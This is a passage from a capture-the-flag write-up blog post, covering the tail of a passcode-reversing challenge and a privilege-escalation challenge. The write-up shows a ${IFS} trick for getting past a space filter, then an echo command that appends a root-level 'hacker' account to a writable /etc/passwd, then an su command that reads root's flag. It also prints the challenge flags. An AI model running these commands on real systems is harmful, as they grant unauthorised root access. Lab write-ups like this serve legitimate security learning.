</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;master locks arent vry strong are they&#34;</span>, s) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlock</span>(s);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not quite!&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that it takes our input, “unleetifies” it (replaces 3 with e, spaces with _, 4 with a and 0 with o), compares it with the passcode and then calls the <strong><strong><strong><strong><strong><strong><strong><strong>unlock()</strong></strong></strong></strong></strong></strong></strong></strong> function</p>
<p>So, we just have to run the binary and enter the following passcode:</p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>m4st3r_l0cks_4r3nt_vry_str0ng_4r3_th3y</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268433-7297da21-0953-4a8c-81e1-6db25c4188b4.png" alt="2022-12-17-231231_758x783_scrot"></p>
<p>flag → <strong>flag{264cec034faef71c642de1721ea26b1f}</strong></p>
<h1 id="the-space-between-us">The Space Between Us</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

I&#39;ve never felt this close to a character before. I hope the feeling is mutual...

Escalate your privileges and retrieve the flag out of root&#39;s home directory.
</code></pre><p>When we connect to the machine using netcat, we see that every spaces are filtered in our commands:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268435-08961a13-3c6a-4d94-a172-d356d9fcb606.png" alt="2022-12-17-231433_634x459_scrot"></p>
<p>So, the first step is finding a way to execute commands with spaces</p>
<p>And to do that, there is an environment variable that exists by default in linux: <strong><strong><strong><strong><strong><strong>${IFS}</strong></strong></strong></strong></strong></strong></p>
<p>For example, to execute <strong><strong><strong><strong><strong><strong>ls -la</strong></strong></strong></strong></strong></strong>, we will have to write <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>ls${IFS}-la</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>Now that we know this, we can list the content of the folder</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268441-0a174e6c-90e2-42cd-b40b-5cd5c1d450ae.png" alt="2022-12-17-231629_567x259_scrot"></p>
<p>We can see a <strong><strong><strong><strong><strong><strong><strong><strong><strong>README.md</strong></strong></strong></strong></strong></strong></strong></strong></strong> file, let’s take a look at it</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268447-6667c331-b64d-4329-8d76-ee4f4a9c82f4.png" alt="2022-12-17-231714_494x197_scrot"></p>
<p>It says that there is a misconfiguration in the filesystem, so we can start taking a look around</p>
<p>After spending a good hour enumerating every files and their permissions, I see that the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/etc/passwd</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> is writable</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268453-d9048712-2fc6-4709-9d19-1e8b10cb6e3f.png" alt="2022-12-17-231901_556x99_scrot"></p>
<p>We are going to add a user to the file, who’s home directory will be <strong><strong><strong><strong><strong>/root</strong></strong></strong></strong></strong></p>
<p>First, we need to generate a password hash for the user</p>
<p><code>⌨️ openssl passwd hack</code></p>
<p>Then, add a new line to the <strong><strong><strong><strong><strong><strong>passwd</strong></strong></strong></strong></strong></strong> file using echo (because nano &amp; vim arent working)</p>
<p><code>⌨️ echo${IFS}&quot;hacker:ZUVbo0DtkXUXw:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268459-7a396236-e4e3-4cbe-b17a-b272225c6241.png" alt="2022-12-17-182345_1888x1032_scrot"></p>
<p>Of course, we still can’t use spaces so we use <strong><strong><strong><strong><strong><strong>${IFS}</strong></strong></strong></strong></strong></strong></p>
<p>Now, we can read <strong><strong><strong><strong><strong><strong><strong><strong>/root/flag.txt</strong></strong></strong></strong></strong></strong></strong></strong> as this user using <strong><strong><strong>su</strong></strong></strong></p>
<p><code>⌨️ echo${IFS}hack${IFS}|${IFS}su${IFS}-${IFS}hacker${IFS}-c${IFS}&quot;cat&lt;/root/flag.txt”</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268465-f4b92ff5-3ff2-47fa-b4f0-6f06026ff481.png" alt="2022-12-17-182532_1888x1032_scrot"></p>
<p>flag → <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>flag{59af40c07bc6f02b457aa4c15543da2d}</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<h1 id="conclusion">Conclusion</h1>
<p>I globally liked this CTF, there were some very interesting rooms and I learned new things so that’s a W</p>
<p>Thanks to everyone who participated and to my tm8 b0unce</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268486-dbb01cf2-d9fe-4558-ba25-322bd76d1aad.png" alt="certificate"></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268490-01653d9d-3f6c-4d60-a146-08cdf933b7cb.png" alt="2022-12-17-232956_1888x1032_scrot"></p>
<p>1479 pts - 53/1658 (my username at the time was 99makarov)</p>
]]></content>
        </item>
        
    </channel>
</rss>
